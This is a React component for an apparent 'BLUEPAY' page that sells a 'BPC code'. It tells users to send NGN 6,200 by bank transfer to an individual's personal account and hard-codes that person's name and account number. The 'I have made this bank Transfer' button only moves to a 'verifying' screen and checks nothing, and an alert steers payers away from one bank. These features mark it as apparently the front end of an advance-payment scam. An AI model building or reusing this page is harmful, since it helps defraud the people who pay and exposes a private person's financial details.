
import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import { ArrowLeft, Copy } from "lucide-react";
import { Button } from "@/components/ui/button";
import { toast } from "@/hooks/use-toast";

const BuyBPCPayment = () => {
  const navigate = useNavigate();
  const [showOpayAlert, setShowOpayAlert] = useState(true);

  const handleCopy = (text: string, type: string) => {
    navigator.clipboard.writeText(text).then(() => {
      toast({
        description: `${type} copied to clipboard!`,
        duration: 2000,
      });
    });
  };

  const handlePaymentConfirm = () => {
    navigate("/buy-bpc/verifying");
  };

  return (
    <div className="min-h-screen flex flex-col bg-background relative overflow-hidden">
      {/* Background gradients */}
      <div className="fixed inset-0 bg-gradient-to-br from-primary/20 via-background to-background" />
      <div className="fixed top-0 right-0 w-96 h-96 bg-space-glow/15 rounded-full blur-3xl" />
      <div className="fixed bottom-0 left-0 w-80 h-80 bg-primary/10 rounded-full blur-3xl" />

      {showOpayAlert && (
        <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50">
          <div 
            className="rounded-lg shadow-lg p-4 max-w-sm w-full mx-4 text-center"
            style={{
              background: 'hsl(var(--card))',
              border: '1px solid hsl(var(--border))',
            }}
          >
            <div className="flex flex-col items-center">
              <img
                src="https://i.ibb.co/qLVCfHVK/icon.jpg"
                alt="Opay Logo"
                className="w-10 h-10 mb-2"
              />
              <h2 className="text-red-400 text-lg font-bold mb-2">
                Opay Service Down
              </h2>
              <p className="text-foreground mb-2 text-sm">
                Please do not use Opay bank for payments at this time.
              </p>
              <div className="bg-red-500/20 border border-red-500/50 text-red-400 px-3 py-2 rounded mb-3 text-xs">
                The Opay bank service is currently experiencing issues. Please
                use other supported banks for your payment.
              </div>
              <Button
                className="w-full py-2 text-sm text-primary-foreground"
                style={{
                  background: 'linear-gradient(135deg, hsl(var(--primary)) 0%, hsl(var(--space-glow)) 100%)',
                }}
                onClick={() => setShowOpayAlert(false)}
              >
                I Understand
              </Button>
            </div>
          </div>
        </div>
      )}

      <header 
        className="relative z-10 py-3 px-4 flex justify-between items-center sticky top-0"
        style={{
          background: 'linear-gradient(135deg, hsl(var(--primary)) 0%, hsl(var(--space-glow)) 100%)',
        }}
      >
        <button className="text-lg">
          <span className="sr-only">Menu</span>
        </button>
        <h1 className="text-xl font-semibold text-primary-foreground">BLUEPAY</h1>
        <div className="w-6 h-6">
          <span className="sr-only">Notifications</span>
        </div>
      </header>

      <div 
        className="relative z-10 py-3 px-4 flex items-center justify-between"
        style={{
          background: 'hsl(var(--secondary) / 0.5)',
          backdropFilter: 'blur(10px)',
        }}
      >
        <div className="flex items-center">
          <button onClick={() => navigate(-1)} className="mr-2 text-foreground">
            <ArrowLeft size={20} />
          </button>
          <h2 className="text-lg font-bold text-foreground">Bank Transfer</h2>
        </div>
        <button
          onClick={() => navigate(-1)}
          className="text-red-400 font-medium text-sm"
        >
          Cancel
        </button>
      </div>

      <div className="relative z-10 flex flex-col items-center p-4 mb-4">
        <h1 className="text-3xl font-bold mb-1 text-foreground">NGN 6,200</h1>
        <p className="text-muted-foreground text-sm">BPC Code Purchase</p>
      </div>

      <div 
        className="relative z-10 mx-4 p-3 rounded-lg"
        style={{
          background: 'hsl(var(--primary) / 0.15)',
          border: '1px solid hsl(var(--primary) / 0.3)',
        }}
      >
        <h3 className="text-primary text-base font-semibold mb-2">
          Instructions:
        </h3>
        <ol className="list-decimal pl-4 text-primary/80 space-y-1 text-sm">
          <li>Copy the account details below</li>it
          <li>Open your bank app and make a transfer</li>
          <li>Return here and click "I have made this bank Transfer"</li>
          <li>Wait for confirmation (usually within 3 minutes)</li>
        </ol>
      </div>

      <div 
        className="relative z-10 m-4 p-3 rounded-lg"
        style={{
          background: 'hsl(var(--card) / 0.8)',
          border: '1px solid hsl(var(--border) / 0.5)',
          backdropFilter: 'blur(20px)',
        }}
      >
        <div className="mb-3">
          <p className="text-muted-foreground text-xs">Amount</p>
          <div className="flex justify-between items-center">
            <p className="text-lg font-bold text-foreground">NGN 6,200</p>
            <Button
              size="sm"
              className="flex items-center gap-1 text-primary-foreground"
              style={{
                background: 'linear-gradient(135deg, hsl(var(--primary)) 0%, hsl(var(--space-glow)) 100%)',
              }}
              onClick={() => handleCopy("6200", "Amount")}
            >
              <Copy size={14} />
              Copy
            </Button>
          </div>
        </div>

        <div className="mb-3 border-t border-border/50 pt-3">
          <p className="text-muted-foreground text-xs">Account Number</p>
          <div className="flex justify-between items-center">
            <p className="text-lg font-bold text-foreground">0091549103</p>
            <Button
              size="sm"
              className="flex items-center gap-1 text-primary-foreground"
              style={{
                background: 'linear-gradient(135deg, hsl(var(--primary)) 0%, hsl(var(--space-glow)) 100%)',
              }}
              onClick={() => handleCopy("0091549103", "Account Number")}
            >
              <Copy size={14} />
              Copy
            </Button>
          </div>
        </div>

        <div className="mb-3 border-t border-border/50 pt-3">
          <p className="text-muted-foreground text-xs">Bank Name</p>
          <p className="text-lg font-bold text-foreground">MOMO PSB</p>
        </div>

        <div className="mb-3 border-t border-border/50 pt-3">
          <p className="text-muted-foreground text-xs">Account Name</p>
          <p className="text-lg font-bold text-foreground">AUWAL HARUNA</p>
        </div>
      </div>

      <p className="relative z-10 text-center px-4 mb-3 text-muted-foreground text-sm">
        Pay to this specific account and get your BPC code
      </p>

      <div className="relative z-10 px-4 mb-6">
        <Button
          className="w-full py-4 text-base font-semibold text-primary-foreground"
          style={{
            background: 'linear-gradient(135deg, hsl(var(--primary)) 0%, hsl(var(--space-glow)) 100%)',
          }}
          onClick={handlePaymentConfirm}
        >
          I have made this bank Transfer
        </Button>
      </div>
    </div>
  );
};

export default BuyBPCPayment;
